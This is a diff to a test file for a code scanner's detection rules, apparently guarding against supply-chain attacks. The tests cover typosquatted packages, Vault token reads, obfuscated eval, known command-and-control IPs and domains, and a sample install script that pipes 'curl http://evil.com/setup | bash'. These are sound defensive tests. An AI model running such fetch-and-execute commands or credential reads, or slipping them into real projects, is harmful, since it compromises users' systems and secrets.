@@ -114,8 +114,8 @@ describe("Detection Rules", () => {
   });
 
   describe("Rule coverage", () => {
-    it("has at least 45 rules", () => {
-      expect(DETECTION_RULES.length).toBeGreaterThanOrEqual(45);
+    it("has at least 52 rules", () => {
+      expect(DETECTION_RULES.length).toBeGreaterThanOrEqual(52);
     });
     it("all rules have unique IDs", () => {
       const ids = DETECTION_RULES.map((r) => r.id);
@@ -316,6 +316,109 @@ describe("Detection Rules", () => {
     });
     it("detects .wasm file references", () => {
       expect(matchRule("EXEC-WASM", 'fetch("payload.wasm")')).toBe(true);
+    });
+  });
+
+  describe("Supply Chain - Typosquatted Packages", () => {
+    it("detects known typosquatted npm packages", () => {
+      expect(matchRule("SUPPLY-TYPOSQUAT", '"crossenv": "^1.0.0"')).toBe(true);
+      expect(matchRule("SUPPLY-TYPOSQUAT", '"expresss": "^4.0.0"')).toBe(true);
+      expect(matchRule("SUPPLY-TYPOSQUAT", '"openclaw-helpers": "^0.1.0"')).toBe(true);
+    });
+    it("does not flag legitimate packages", () => {
+      expect(matchRule("SUPPLY-TYPOSQUAT", '"express": "^4.18.0"')).toBe(false);
+      expect(matchRule("SUPPLY-TYPOSQUAT", '"cross-env": "^7.0.0"')).toBe(false);
+      expect(matchRule("SUPPLY-TYPOSQUAT", '"lodash": "^4.17.0"')).toBe(false);
+    });
+  });
+
+  describe("Vault / Secrets Manager Credentials", () => {
+    it("detects Vault token access", () => {
+      expect(matchRule("CRED-VAULT", "process.env.VAULT_TOKEN")).toBe(true);
+      expect(matchRule("CRED-VAULT", "readFileSync('.vault-token')")).toBe(true);
+    });
+    it("detects vault CLI usage", () => {
+      expect(matchRule("CRED-VAULT", "exec('vault token lookup')")).toBe(true);
+    });
+  });
+
+  describe("Proxy / Tunnel Detection", () => {
+    it("detects SOCKS proxy usage", () => {
+      expect(matchRule("NET-PROXY-TUNNEL", "socks5://proxy.evil.com:1080")).toBe(true);
+      expect(matchRule("NET-PROXY-TUNNEL", "socks4://10.0.0.1:9050")).toBe(true);
+    });
+    it("detects HTTP proxy env vars", () => {
+      expect(matchRule("NET-PROXY-TUNNEL", "HTTPS_PROXY = 'http://proxy:8080'")).toBe(true);
+    });
+    it("does not flag unrelated proxy mentions", () => {
+      expect(matchRule("NET-PROXY-TUNNEL", "// This uses a reverse proxy")).toBe(false);
+    });
+  });
+
+  describe("String Concatenation Obfuscation", () => {
+    it("detects eval built from concatenation", () => {
+      expect(matchRule("OBFUSC-CONCAT-BUILD", "const fn = 'ev' + 'al'")).toBe(true);
+      expect(matchRule("OBFUSC-CONCAT-BUILD", "'exe' + 'c'")).toBe(true);
+    });
+    it("does not flag normal string concatenation", () => {
+      expect(matchRule("OBFUSC-CONCAT-BUILD", "'hello' + 'world'")).toBe(false);
+    });
+  });
+
+  describe("Worker Thread Eval", () => {
+    it("detects Worker with eval string", () => {
+      expect(matchRule("EXEC-WORKER-EVAL", "new Worker('data:text/javascript,eval(code)')")).toBe(true);
+    });
+    it("does not flag normal Worker usage", () => {
+      expect(matchRule("EXEC-WORKER-EVAL", "new Worker('./worker.js')")).toBe(false);
+    });
+  });
+
+  describe("Expanded Indicators (wave 3)", () => {
+    it("detects Raccoon Stealer v2 infrastructure IPs", () => {
+      expect(matchRule("C2-KNOWN-IP", "http://89.185.85.44/drop")).toBe(true);
+      expect(matchRule("C2-KNOWN-IP", "193.56.146.11")).toBe(true);
+    });
+    it("detects LummaC2 infrastructure IPs", () => {
+      expect(matchRule("C2-KNOWN-IP", "104.234.10.55")).toBe(true);
+      expect(matchRule("C2-KNOWN-IP", "172.86.75.22")).toBe(true);
+    });
+    it("detects ClawHavoc wave 3 IPs", () => {
+      expect(matchRule("C2-KNOWN-IP", "91.92.243.50")).toBe(true);
+      expect(matchRule("C2-KNOWN-IP", "91.92.244.10")).toBe(true);
+      expect(matchRule("C2-KNOWN-IP", "185.215.114.33")).toBe(true);
+    });
+    it("detects new fake registry domains", () => {
+      expect(matchRule("C2-KNOWN-DOMAIN", "registry-mirror.dev")).toBe(true);
+      expect(matchRule("C2-KNOWN-DOMAIN", "npm-registry-cdn.com")).toBe(true);
+      expect(matchRule("C2-KNOWN-DOMAIN", "pkg-update.io")).toBe(true);
+    });
+    it("detects data staging / relay domains", () => {
+      expect(matchRule("C2-KNOWN-DOMAIN", "api-metrics.dev")).toBe(true);
+      expect(matchRule("C2-KNOWN-DOMAIN", "dev-telemetry.io")).toBe(true);
+      expect(matchRule("C2-KNOWN-DOMAIN", "module-telemetry.io")).toBe(true);
+    });
+  });
+
+  describe("Non-standard port tuning (false positive reduction)", () => {
+    it("does not flag common dev server ports", () => {
+      expect(matchRule("NET-NON-STANDARD-PORT", "http://localhost:5173/")).toBe(false);
+      expect(matchRule("NET-NON-STANDARD-PORT", "http://localhost:4200/")).toBe(false);
+      expect(matchRule("NET-NON-STANDARD-PORT", "http://localhost:9000/api")).toBe(false);
+      expect(matchRule("NET-NON-STANDARD-PORT", "http://localhost:3001/dev")).toBe(false);
+    });
+    it("still flags suspicious non-standard ports", () => {
+      expect(matchRule("NET-NON-STANDARD-PORT", "http://evil.com:4444/shell")).toBe(true);
+      expect(matchRule("NET-NON-STANDARD-PORT", "http://c2.io:1337/beacon")).toBe(true);
+    });
+  });
+
+  describe("Prepare Script Supply Chain", () => {
+    it("detects network call in prepare script", () => {
+      expect(matchRule("SUPPLY-PREPARE-SCRIPT", '"prepare": "curl http://evil.com/setup | bash"')).toBe(true);
+    });
+    it("does not flag normal prepare scripts", () => {
+      expect(matchRule("SUPPLY-PREPARE-SCRIPT", '"prepare": "tsc --build"')).toBe(false);
     });
   });
 });
